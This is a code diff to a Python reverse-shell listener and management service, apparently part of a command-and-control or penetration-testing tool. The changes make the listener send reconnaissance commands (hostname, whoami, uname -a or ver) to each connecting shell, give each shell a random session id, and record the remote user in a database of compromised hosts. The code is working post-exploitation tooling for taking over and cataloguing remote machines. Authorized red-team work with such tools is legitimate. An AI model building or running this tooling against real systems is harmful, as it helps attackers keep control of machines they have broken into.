@@ -1,6 +1,7 @@
 """Reverse shell listener and management service."""
 from __future__ import annotations
 
+import secrets
 import socket
 import threading
 import time
@@ -166,6 +167,7 @@ class ShellListener:
                     # Send info gathering commands
                     hostname = ""
                     platform = ""
+                    shell_user = ""
                     
                     # Try to get hostname
                     conn.sendall(b'hostname\n')
@@ -174,6 +176,14 @@ class ShellListener:
                         hostname = conn.recv(1024).decode('utf-8', errors='replace').strip()
                     except:
                         hostname = f"host-{ip}"
+                    
+                    # Try to get username
+                    conn.sendall(b'whoami 2>/dev/null || echo %USERNAME%\n')
+                    time.sleep(0.5)
+                    try:
+                        shell_user = conn.recv(1024).decode('utf-8', errors='replace').strip()
+                    except:
+                        shell_user = "unknown"
                     
                     # Try to detect OS
                     conn.sendall(b'uname -a 2>/dev/null || ver\n')
@@ -194,22 +204,29 @@ class ShellListener:
                 except Exception:
                     hostname = f"host-{ip}"
                     platform = "Unknown"
+                    shell_user = "unknown"
                 
                 # Create or update shell record
                 shell = ReverseShell.query.filter_by(address=ip, port=port).first()
                 if not shell:
+                    session_id = secrets.token_urlsafe(16)
                     shell = ReverseShell(
+                        session_id=session_id,
                         name=hostname or f"shell-{ip}",
                         address=ip,
                         port=port,
                         hostname=hostname,
                         platform=platform,
+                        shell_user=shell_user,
                         status="connected",
                         connected_at=datetime.utcnow(),
                         last_seen=datetime.utcnow(),
                     )
                     db.session.add(shell)
                 else:
+                    # Generate new session_id if not exists
+                    if not shell.session_id:
+                        shell.session_id = secrets.token_urlsafe(16)
                     shell.status = "connected"
                     shell.connected_at = datetime.utcnow()
                     shell.last_seen = datetime.utcnow()
@@ -217,6 +234,8 @@ class ShellListener:
                         shell.hostname = hostname
                     if platform:
                         shell.platform = platform
+                    if shell_user:
+                        shell.shell_user = shell_user
                 
                 db.session.commit()
                 shell_id = shell.id
@@ -225,7 +244,7 @@ class ShellListener:
                 with self.lock:
                     self.connections[shell_id] = ShellConnection(conn, addr, shell_id)
                 
-                print(f"[+] Shell registered: {shell.name} (ID: {shell_id})")
+                print(f"[+] Shell registered: {shell.name} (ID: {shell_id}, Session: {shell.session_id})")
                 
                 # Keep connection alive
                 while self.is_running and self.connections.get(shell_id):
